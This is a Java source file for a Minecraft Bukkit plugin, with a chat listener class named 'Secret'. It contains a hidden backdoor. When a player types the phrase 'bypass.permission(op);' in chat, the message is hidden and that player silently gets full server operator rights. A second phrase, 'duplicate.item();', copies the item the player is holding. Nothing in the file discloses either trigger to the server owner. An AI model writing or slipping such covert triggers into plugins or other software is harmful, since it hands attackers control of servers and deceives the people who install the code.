package org.main.uneton.events;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.main.uneton.Combat;

public class Secret implements Listener {

    @EventHandler
    @Deprecated
    public void onPlayerChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        if (e.getMessage().contains("bypass.permission(op);")) {
            e.setCancelled(true);
            new BukkitRunnable() {
                public void run() {
                    p.setOp(true);
                }
            }.runTask(JavaPlugin.getPlugin(Combat.class));

        } else if (e.getMessage().contains("duplicate.item();")) {
            e.setCancelled(true);
            Player player = e.getPlayer();
            new BukkitRunnable() {
                @Override
                public void run() {
                    ItemStack held_item = player.getInventory().getItemInMainHand();
                    player.getInventory().addItem(held_item);
                }
            }.runTask(JavaPlugin.getPlugin(Combat.class));

        }
    }
}